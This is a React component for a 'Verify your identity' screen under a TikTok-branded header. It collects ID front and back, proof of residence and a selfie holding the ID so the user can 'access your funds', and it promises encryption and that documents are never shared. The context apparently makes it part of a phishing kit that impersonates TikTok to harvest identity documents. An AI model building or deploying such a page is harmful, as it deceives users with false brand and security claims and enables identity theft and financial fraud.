import { useState } from "react";
import { Button } from "@/components/ui/button";
import { Upload, CheckCircle, ShieldCheck, Camera } from "lucide-react";
import { Progress } from "@/components/ui/progress";
import TikTokHeader from "./TikTokHeader";

interface DocumentUploadScreenProps {
  userName: string;
  onSubmit: () => void;
}

interface UploadField {
  label: string;
  description: string;
  key: string;
}

const fields: UploadField[] = [
  { label: "Identity Document (Front)", description: "Upload the front of your ID, passport, or driver's license", key: "id_front" },
  { label: "Identity Document (Back)", description: "Upload the back of your identity document", key: "id_back" },
  { label: "Proof of Residence", description: "Utility bill or bank statement (last 3 months)", key: "residence" },
  { label: "Selfie with Document", description: "Take a selfie holding your identity document", key: "selfie" },
];

const DocumentUploadScreen = ({ userName, onSubmit }: DocumentUploadScreenProps) => {
  const [files, setFiles] = useState<Record<string, File | null>>({});
  const [submitting, setSubmitting] = useState(false);

  const handleFile = (key: string, file: File | null) => {
    setFiles((prev) => ({ ...prev, [key]: file }));
  };

  const uploadedCount = fields.filter((f) => files[f.key]).length;
  const allUploaded = uploadedCount === fields.length;
  const progressPercent = (uploadedCount / fields.length) * 100;

  const handleSubmit = async () => {
    setSubmitting(true);
    await onSubmit();
    setSubmitting(false);
  };

  return (
    <div className="min-h-screen flex flex-col bg-background">
      <TikTokHeader showHelp />

      <div className="flex-1 px-6 py-6">
        <p className="text-sm text-muted-foreground mb-1">
          Welcome back, <strong className="text-foreground">{userName}!</strong>
        </p>

        {/* Step indicator */}
        <div className="mt-4 mb-2 flex items-center justify-between">
          <h2 className="text-xl font-semibold">Verify your identity</h2>
          <span className="text-xs font-semibold text-muted-foreground bg-secondary px-3 py-1 rounded-full">
            Step 2 of 4
          </span>
        </div>
        <p className="text-sm text-muted-foreground mb-4">
          Upload the required documents to verify your account and access your funds.
        </p>

        {/* Security notice */}
        <div className="flex items-center gap-2 p-3 rounded-xl bg-success/5 border border-success/20 mb-5">
          <ShieldCheck className="w-4 h-4 text-success shrink-0" />
          <p className="text-xs text-muted-foreground">Your data is <strong className="text-foreground">encrypted</strong> and securely stored. We never share your documents.</p>
        </div>

        {/* Progress bar */}
        <div className="mb-6">
          <div className="flex justify-between text-xs text-muted-foreground mb-1.5">
            <span>{uploadedCount} of {fields.length} uploaded</span>
            <span>{Math.round(progressPercent)}%</span>
          </div>
          <Progress value={progressPercent} className="h-2" />
        </div>

        <div className="space-y-3">
          {fields.map((field) => {
            const uploaded = !!files[field.key];
            return (
              <label
                key={field.key}
                className={`flex items-center gap-4 p-4 rounded-xl border cursor-pointer transition-all duration-200 ${
                  uploaded
                    ? "border-success/40 bg-success/5 shadow-sm"
                    : "border-border bg-card hover:border-foreground/30 hover:shadow-sm hover:bg-secondary/50"
                }`}
              >
                <div className={`flex items-center justify-center w-10 h-10 rounded-full shrink-0 ${
                  uploaded ? "bg-success/10" : "bg-secondary"
                }`}>
                {uploaded ? (
                    <CheckCircle className="w-5 h-5 text-success" />
                  ) : field.key === "selfie" ? (
                    <Camera className="w-4 h-4 text-muted-foreground" />
                  ) : (
                    <Upload className="w-4 h-4 text-muted-foreground" />
                  )}
                </div>
                <div className="flex-1 min-w-0">
                  <p className="text-sm font-semibold">{field.label}</p>
                  <p className="text-xs text-muted-foreground">{field.description}</p>
                  {!files[field.key] && (
                    <p className="text-[10px] text-muted-foreground/60 mt-0.5">JPG, PNG or PDF · Max 10MB</p>
                  )}
                  {files[field.key] && (
                    <p className="text-xs text-success mt-1 font-medium truncate">
                      ✓ {files[field.key]!.name}
                    </p>
                  )}
                </div>
                <input
                  type="file"
                  accept="image/*,.pdf"
                  className="hidden"
                  onChange={(e) => handleFile(field.key, e.target.files?.[0] || null)}
                />
              </label>
            );
          })}
        </div>

        <Button
          onClick={handleSubmit}
          disabled={!allUploaded || submitting}
          className="w-full h-14 rounded-full text-base font-semibold mt-8"
        >
          {submitting ? (
            <span className="flex items-center gap-2">
              <span className="w-4 h-4 border-2 border-primary-foreground/40 border-t-primary-foreground rounded-full animate-spin" />
              Submitting...
            </span>
          ) : (
            "Submit Documents"
          )}
        </Button>
      </div>
    </div>
  );
};

export default DocumentUploadScreen;
